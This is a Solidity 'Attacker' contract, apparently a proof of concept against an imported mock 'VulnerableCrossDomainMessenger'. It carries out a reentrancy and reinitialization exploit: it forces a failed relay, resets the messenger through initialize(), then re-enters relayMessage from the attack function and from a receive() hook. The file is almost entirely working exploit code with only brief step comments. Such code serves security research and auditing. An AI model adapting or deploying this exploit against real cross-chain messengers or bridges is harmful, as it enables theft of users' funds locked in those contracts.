// SPDX-License-Identifier: MIT pragma solidity ^0.8.0;

import "./VulnerableCrossDomainMessenger.sol";
 import "./ExploitableContract.sol";

contract Attacker { 
    VulnerableCrossDomainMessenger public messenger; 
    ExploitableContract public exploitable;

constructor(VulnerableCrossDomainMessenger _messenger, ExploitableContract _exploitable) {
    messenger = _messenger;
    exploitable = _exploitable;
}

function attack(bytes memory data, bytes32 versionedHash) external payable {
    // Step 1: Trigger a failed message to mark it as failed
    try messenger.relayMessage(address(exploitable), data, 100000, versionedHash) {
        revert("Initial message should fail");
    } catch {}

    // Step 2: Simulate an upgrade resetting xDomainMsgSender
    messenger.initialize();

    // Step 3: Reenter `relayMessage` during retry
    messenger.relayMessage{value: msg.value}(address(exploitable), data, 100000, versionedHash);
}

receive() external payable {
    // During the reentrant call, exploit the inconsistent state
    messenger.relayMessage{value: msg.value}(address(exploitable), "", 100000, keccak256("reentrant_call"));
}
}